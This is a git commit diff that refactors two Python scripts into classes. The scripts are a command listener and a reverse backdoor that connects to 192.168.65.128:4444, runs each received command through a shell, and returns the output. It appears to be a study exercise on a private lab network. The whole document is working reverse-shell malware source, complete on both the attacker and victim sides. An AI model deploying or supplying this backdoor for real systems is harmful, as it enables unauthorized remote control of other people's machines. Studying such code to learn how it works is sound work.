61787e5c4933285b91a8ecefad9301236f4771c0
itzVort3x1 <saikaustubh10@gmail.com>
2024-07-29 11:12:10 +0530

    refactored code

--- listener.py
+++ listener.py
@@ -1,18 +1,27 @@
 #!/usr/bin/env python
-
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("192.168.65.128", 4444))
-listener.listen(0)
-print("[+] waiting for incoming connection")
-connection, address = listener.accept()
-print("[+] Got a connection from " + str(address))
 
-while True:
-    command = raw_input(">> ")
-    connection.send(command)
-    result = connection.recv(1024)
-    print(result)
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connections!")
+        self.conn, addr = listener.accept()
+        print("[+] Got a new connection from " + str(addr))
 
+    def execute_remotely(self, command):
+        self.conn.send(command)
+        return self.conn.recv(1024)
+
+    def run(self):
+        while True:
+            command = raw_input(">> ")
+            command_result = self.execute_remotely(command)
+            print(command_result)
+
+
+my_listener = Listener("192.168.65.128", 4444)
+my_listener.run()
--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -3,20 +3,21 @@
 import socket
 import subprocess
 
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
+
+    def run(self):
+        while True:
+            command = self.connection.recv(1024)
+            command_result = self.execute_system_command(command)
+            self.connection.send(command_result)
+        self.connection.close()
 
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("192.168.65.128", 4444))
-
-connection.send("\n[+] Connection established.\n".encode())
-
-while True:
-    command = connection.recv(1024)
-    command_result = execute_system_command(command)
-    connection.send(command_result)
-
-
-connection.close()
+my_backdoor = Backdoor("192.168.65.128", 4444)
+my_backdoor.run()
